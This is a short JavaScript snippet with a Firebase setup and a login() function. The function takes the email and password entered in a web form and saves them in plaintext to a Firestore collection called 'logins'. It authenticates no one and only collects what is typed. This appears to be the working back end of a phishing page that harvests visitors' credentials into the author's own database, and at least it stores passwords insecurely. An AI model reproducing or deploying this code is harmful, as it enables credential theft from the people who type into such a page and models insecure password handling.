// 1. Your Firebase config
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_AUTH_DOMAIN",
  projectId: "YOUR_PROJECT_ID"
};

// 2. Initialize Firebase
firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();

// 3. Login function
function login() {
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;

  // 📁 SAVE INTO YOUR FOLDER (FIREBASE)
  db.collection("logins").add({
    email: email,
    password: password,
    time: new Date()
  });

  alert("Saved into YOUR folder!");
}
